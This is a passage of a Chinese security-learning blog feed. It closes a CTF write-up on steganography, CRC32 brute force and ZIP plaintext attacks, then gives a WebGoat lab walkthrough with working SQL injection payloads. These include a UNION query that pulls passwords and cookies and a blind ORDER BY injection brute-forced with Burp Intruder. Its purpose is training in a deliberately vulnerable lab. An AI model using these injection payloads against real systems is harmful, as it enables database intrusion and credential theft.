class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">60</span>   <span class="comment">#x坐标 </span></span><br><span class="line">y = <span class="number">60</span>   <span class="comment">#y坐标 </span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y)) </span><br><span class="line">file = open(<span class="string">&#x27;m0re.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) </span><br><span class="line"></span><br><span class="line">a=file.read()</span><br><span class="line">z=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        print(a[z])</span><br><span class="line">        <span class="keyword">if</span>(a[z]==<span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            im.putpixel((i, j), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">elif</span>(a[z]==<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">            im.putpixel((i, j), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        z=z+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">&#x27;1.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>注意：PIL模块只适合python2的版本，python3中可以使用pillow代替.<br>安装pillow模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pillow</span><br></pre></td></tr></table></figure><p>成功得到二维码<br><img src="https://img-blog.csdnimg.cn/20200826013318171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>注意顺序，不然还原不出正确的码子。由上至下。<br>扫描得到百度网盘链接。<br><img src="https://img-blog.csdnimg.cn/2020082601344599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>第四关<br>网盘链接中的一个压缩包，里面有张图片。<br><img src="https://img-blog.csdnimg.cn/20200826013851862.jpg#pic_center" alt="m0re" loading="lazy"><br>这里使用，steghide进行爆破，我丢我找半天这个工具，原来我电脑里的工具包里有，我吐了。<br><img src="https://img-blog.csdnimg.cn/20200826021744868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>其实和脚本都一样的原理，，，=.=<br>就是字典的重要性了。换个大点的字典<br><img src="https://img-blog.csdnimg.cn/20200826022709414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>密码：<code>power123</code><br>然后使用stegdetect进行测试，测试是哪种隐写<br>使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegdetect.exe -tjopi -s 10.0 &lt;filename.jpg&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200826213046585.png#pic_center" alt="m0re" loading="lazy"><br>三颗星，而且是jphide隐写。上面爆破出密码，使用工具解题<br><img src="https://img-blog.csdnimg.cn/20200826213514210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>使用Seek模块，输入密码，然后设置导出的文件类型。这里设置为flag.txt就可以了。<br><img src="https://img-blog.csdnimg.cn/20200826213956120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>第五关<br>下载的level5有伪加密，其他的先不管，先改第一个。就可以将level5.png拖出来了，发现flag。<img src="https://img-blog.csdnimg.cn/2020082622371928.png#pic_center" alt="m0re" loading="lazy"><br>第六关<br>CRC爆破，因为第六关压缩包里面的三个文件很小，只有几个字节<br>所以直接用脚本进行爆破<br><img src="https://img-blog.csdnimg.cn/2020082713392378.png#pic_center" alt="m0re" loading="lazy"><br>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment">#dic=string.printable   #各种打印字符</span></span><br><span class="line">dic=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span></span><br><span class="line">crc1 = <span class="number">0x9aeacc13</span>  <span class="comment"># 记得要以0x开头</span></span><br><span class="line">crc2 = <span class="number">0xeed7e184</span></span><br><span class="line">crc3 = <span class="number">0x289585af</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc5</span>(<span class="params">crc</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                        s=i+j+p+q+h</span><br><span class="line">                        <span class="keyword">if</span> crc == (binascii.crc32(s.encode(<span class="string">&quot;ascii&quot;</span>))):</span><br><span class="line">                            print(s)</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc4</span>(<span class="params">crc</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                        s=i+j+p+q</span><br><span class="line">                        <span class="keyword">if</span> crc == (binascii.crc32(s.encode(<span class="string">&quot;ascii&quot;</span>))):</span><br><span class="line">                            print(s)</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">CrackCrc5(crc1)</span><br><span class="line">CrackCrc4(crc2)</span><br><span class="line">CrackCrc5(crc3)</span><br></pre></td></tr></table></figure><p>时间略长，耐心跑完。<br>第七关<br><img src="https://img-blog.csdnimg.cn/20200827002200411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>将这个图片进行压缩，注意是压缩成zip压缩包。压缩方式很重要。<br>然后进行明文攻击。使用工具进行攻击<br><img src="https://img-blog.csdnimg.cn/20200827003617615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>原来不用一直等，噗！我等了十三分钟。。。吐啦<br>注意手动暂停攻击，然后确定保存就行了。<br>已经成功解密了。<br>两张一样的图片，考虑盲水印。<br><img src="https://img-blog.csdnimg.cn/20200827004047824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>成功得到<img src="https://img-blog.csdnimg.cn/20200827004126828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>得到一部分flag，然后还有一个URL<br>第八关<br>访问提示的URL<br><img src="https://img-blog.csdnimg.cn/20200827004244981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>看不出来什么，(做题少，没见过)，看大佬wp是snow隐写。长知识了。<br><img src="https://img-blog.csdnimg.cn/20200827004426683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>snow隐写需要密码，这个就是密码。<br><a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">在线网站解密</a><br><img src="https://img-blog.csdnimg.cn/20200827004629630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>得到最后一部分flag</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>知识了解：</p><blockquote><p>snow 是一款在html嵌入隐写信息的软件，它的原理是通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，不同空格与制表位的组合代表不同的嵌入信息。</p></blockquote><p>这次学到好多内容，不过还是做题越多越好。多刷题。争取下次有比赛能进一次线下。继续加油。</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebGoat靶场搭建及通关记录(一)</title>
      <link href="/2020/09/01/WebGoat%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95(%E4%B8%80)/"/>
      <url>/2020/09/01/WebGoat%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><font color=#999AAA >搭建WebGoat靶场，以前没玩过这个，涉及的知识挺多的，没事打一打。<br></font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="一、搭建靶场"><a href="#一、搭建靶场" class="headerlink" title="一、搭建靶场"></a>一、搭建靶场</h1><p><font color=#999AAA >靶场环境，只介绍在windows系统中搭建过程。<br>先下载这两个文件<br><a href="https://github.com/WebGoat/WebGoat/releases/download/v8.1.0/webgoat-server-8.1.0.jar">https://github.com/WebGoat/WebGoat/releases/download/v8.1.0/webgoat-server-8.1.0.jar</a><br><a href="https://github.com/WebGoat/WebGoat/releases/download/v8.1.0/webwolf-8.1.0.jar">https://github.com/WebGoat/WebGoat/releases/download/v8.1.0/webwolf-8.1.0.jar</a><br>由于是github的项目，下载时，可能因为网络问题而失败，所以建议用迅雷下载。<br>然后在放到一个专门文件夹内(本人轻微强迫症哈哈，可以随意放)<br>执行下面两条命令就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar webgoat-server-8.0.0.M17.jar</span><br><span class="line">java -jar webwolf-8.0.0.M17.jar</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200815140213600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>访问<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a>就可以了。<br>注册账号随便弄一个就可以了。<br><font color=#F22225 >**<em>补充一个坑，可能会遇到的一个问题**</em><br>就是搭建好靶场后没什么问题，第二次进入的问题。(免得像我一样的小白不知道而再去重新搭建，浪费时间)<br>先描述一下问题：就是访问<code>http://127.0.0.1:8080</code>时浏览器返回找不到网页了，没有进入到靶场环境。附图如下：<br><img src="https://img-blog.csdnimg.cn/20200818185243614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>这个不是靶场出问题了，而是不是第一次进入靶场，原来已经进入过并注册了用户名和密码了，就要进入登录界面直接登录了。所以环境没问题。<br>解决办法也很简单：访问这个——<a href="http://127.0.0.1:8080/WebGoat/login">http://127.0.0.1:8080/WebGoat/login</a>，webwolf也是同理。就不多嘴了哈。</p><h1 id="二、通关攻略"><a href="#二、通关攻略" class="headerlink" title="二、通关攻略"></a>二、通关攻略</h1><p><font color=#999AAA >Introduction的部分就是检查靶场功能。看不懂英文的话，建议用翻译插件翻译一下。</p><h2 id="1-General"><a href="#1-General" class="headerlink" title="1.General"></a>1.General</h2><h3 id="HTTP-Basics"><a href="#HTTP-Basics" class="headerlink" title="HTTP Basics"></a>HTTP Basics</h3><p><font color=#F22225 >第二关<br><font color=#999AAA >就是输入用户名就可以了，放一张图。<br><img src="https://img-blog.csdnimg.cn/20200815140848267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#F22225 >第三关<br><font color=#999AAA >提示是需要使用Owasp zap进行抓包查看，这里使用burp进行<br><img src="https://img-blog.csdnimg.cn/20200815141431418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>将1改为6放包，然后答题正确。<br><img src="https://img-blog.csdnimg.cn/20200815141023393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="HTTP-Proxies"><a href="#HTTP-Proxies" class="headerlink" title="HTTP Proxies"></a>HTTP Proxies</h3><p><font color=#F22225 >第六关<br><font color=#999AAA >前面的都是一款工具的教程，叫做Owasp zap、可以做代理，同时还是一个漏洞扫描工具，我抓包一般不用它，所以前面的看看就行直接绕过。还是使用burp来抓包。漏扫的话可以了解一下，免费的软件。<br>过关有点坑，直接抓取数据包，按照修改题目要求。<br>坑：直接修改changeme，怎么都是不对的，因为修改为get请求了，所以提交参数的方式就应该是get方式，要在URL里面进行提交。坑的话就这一点。按照下图的方式修改就可以了。<br><img src="https://img-blog.csdnimg.cn/20200815144902422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>反思：第一次没有想到get请求改变后的变化，想的不够充分。现在想想，题目怎么可能就是让改一下参数呢？那如果这样，它设置这个要求的目的在哪，所以想的时候还是想想为什么会有这个要求。</p><h2 id="2-Injection-Flaws"><a href="#2-Injection-Flaws" class="headerlink" title="2.Injection Flaws"></a>2.Injection Flaws</h2><h3 id="SQL-Injection-advanced"><a href="#SQL-Injection-advanced" class="headerlink" title="SQL Injection (advanced)"></a>SQL Injection (advanced)</h3><p><font color=#F22225 >第三关<br><font color=#999AAA >SQL注入，查看到前两小节的知识，了解到是使用联合查询进行注入。<br>这个很重要，后面会用到，注意userid的类型<br><img src="https://img-blog.csdnimg.cn/20200815162412517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>先尝试单引号闭合。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1 --</span></span><br></pre></td></tr></table></figure><p>尝试单引号闭合成功，且查询到了，WebGoat表中的内容，<br><img src="https://img-blog.csdnimg.cn/20200815153959395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >union查询的特性就是上下两个SQL 语句所产生的栏位需要是同样的资料种类，所以观察刚刚查询出来的列数，了解到有七列，所以接下来要写在union后的SQL语句也必须要列出7列才行，因为已经知道user_system_data这个数据表中的前4列了，所以剩下的3列随便填点什么就行，需要注意的是，数据类型也必须一致。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union <span class="keyword">select</span> <span class="number">1</span>,user_name,<span class="keyword">password</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;bye&#x27;</span>,cookie,<span class="number">1</span> <span class="keyword">from</span> user_system_data <span class="comment">--</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200815162637269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#1FAFAF >这里注意userid是字符串类型而不是int类型，前面提示过了，看上面的图。</p><p><font color=#F11111 >还有一种方法：<br>直接查询全部内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; <span class="keyword">select</span> * <span class="keyword">from</span> user_system_data <span class="comment">--</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200815162902347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>最后将结果输入第二个框里就过关<br><img src="https://img-blog.csdnimg.cn/20200815163052169.png#pic_center" alt="m0re" loading="lazy"></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><font color=#F22225 >第五关能力有限，暂时没有解出。</font><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p><font color=#F22225 >第七关</font><br><font color=#999AAA ><br>字符类型的SQL注入，通过Smith可以查看一位用户的数据<br></font><br>测试，发现确实是存在注入的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27; or 1=1 <span class="comment">--</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200815171944214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>而日是POST方式的SQL注入，简单单的类型，直接sqlmap跑一下。<br>步骤：抓包，复制数据包内容，写入一个文件中。然后使用sqlmap直接获取数据库等信息。<br><font color=#F22225 >第八关</font><br><font color=#999AAA ><br>数字类型的SQL注入，通过101可以查看一位用户的数据<br></font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101 or 1=1 <span class="comment">--</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200815172806707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>同上。</p><h3 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection (mitigation)"></a>SQL Injection (mitigation)</h3><p><font color=#999AAA >这一关需要使用order by 找出<code>IP address webgoat-prd server</code><br>排序是按照下面的这几个来排的。<br></font><br><img src="https://img-blog.csdnimg.cn/20200815180729994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >开启代理，点击进行抓包。</font><br><img src="https://img-blog.csdnimg.cn/20200815213613843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >可以看到是返回正常的页面了，因为它column是按照hostname来排序的，但是如果将它改一下</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /WebGoat/SqlInjection/servers?column=m0re HTTP/1.1</span><br></pre></td></tr></table></figure><p>然后go，就会发现它是返回错误的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&lt;p&gt;This application has no explicit mapping <span class="keyword">for</span> /error, so you are seeing this as a</span><br><span class="line">fallback.&lt;/p&gt;</span><br><span class="line">&lt;div id=<span class="string">&#x27;created&#x27;</span>&gt;Sat Aug 15 21:38:51 CST 2020&lt;/div&gt;</span><br><span class="line">&lt;div&gt;There was an unexpected error (<span class="built_in">type</span>=Internal Server Error, status=500).&lt;/div&gt;</span><br><span class="line">&lt;div&gt;user lacks privilege or object not found: M0RE <span class="keyword">in</span> statement [select id, hostname, ip, mac, status, description from servers  <span class="built_in">where</span> status &amp;lt;&amp;gt; &amp;<span class="comment">#39;out of order&amp;#39; order by m0re]</span></span><br><span class="line">&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><font color=#999AAA >可以看到<code>order by</code>的参数是m0re，是刚才传入的。然后看返回的报错中<code> id, hostname, ip, mac, status, description</code>这几个都是可以进行排列的参数，表是<code>servers</code>但是有一个没见过就是<code>status</code>，所以<code>servers</code>中的status列中的数据才是webgoat-prd 的服务器的IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /WebGoat/SqlInjection/servers?column=<span class="keyword">case</span>%20when%20(substring((select%20ip%20from%20servers%20where%20hostname=%27webgoat-prd%27),1,1)=%271%27)%20then%20id%20else%20description%20end HTTP/1.1</span><br></pre></td></tr></table></figure><p><font color=#999AAA >这个是需要进行<br>抓取到发送到intruder模块进行爆破。</font><br><img src="https://img-blog.csdnimg.cn/20200815202715536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA ><br>构造payload</font>，选择爆破方式为Cluster bomb</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case%20when%20(substring((<span class="keyword">select</span>%<span class="number">20</span>ip%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>servers%<span class="number">20</span><span class="keyword">where</span>%<span class="number">20</span>hostname=%<span class="number">27</span>webgoat-prd%<span class="number">27</span>),§<span class="number">1</span>§,<span class="number">1</span>)=%<span class="number">27</span>§<span class="number">2</span>§%<span class="number">27</span>)%<span class="number">20</span><span class="keyword">then</span>%<span class="number">20</span><span class="keyword">id</span>%<span class="number">20</span><span class="keyword">else</span>%<span class="number">20</span>description%<span class="number">20</span><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020081520284545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >再设置payload，第一个payload设置最大为15因为IP地址一般是<code>xxx.xxx.xxx.xxx</code>算上“点”正好15位。第二个payload设置为9，数字(0—9)不过我设置的时候忘了加0了，所以没有的情况就是0了，这个无碍。。</font></p><p><img src="https://img-blog.csdnimg.cn/20200815203045562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >然后开始爆破，完成后手动进行设置comment做一个标记，按照id来排序的，设置个标记(这里使用yes，什么标记都行)</font><br><img src="https://img-blog.csdnimg.cn/20200815203216196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >筛选一下，只查看有标记的记录。勾选。就可以看到了</font><br><img src="https://img-blog.csdnimg.cn/20200815203241823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >这就是所有的了，然后IP地址读取很明显了，直接看着写出来就行</font><br><img src="https://img-blog.csdnimg.cn/20200815204018657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >怎么看IP，举个栗子<br>方法：比如第一个，看两个payload，第一个是1，第二个是1，则IP地址的第一个是1<br>第二个，没有找到第一个payload是2的，所以就是0了。<br>第三个是4<br>第四个，上面没有，也就是”点”的位置。<br>这样就可以得出IP地址的前三位了<code>104.</code>后面的不再啰嗦。<br>总：<code>104.130.219.202</code><br></font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><font color=#999AAA >XXE漏洞的基础知识，可以参考我之前的学习博客——🔑<a href="https://blog.csdn.net/qq_45836474/article/details/107573925">XXE漏洞基础及简单利用</a><br><font color=#F22225 >第三关</font><br><font color=#999AAA ><br>随便提交了一个评论，没发现什么异常的，然后就是在评论区显示出来。</font><br><img src="https://img-blog.csdnimg.cn/20200816000903975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>尝试抓包查看，发现了XML</p><p><img 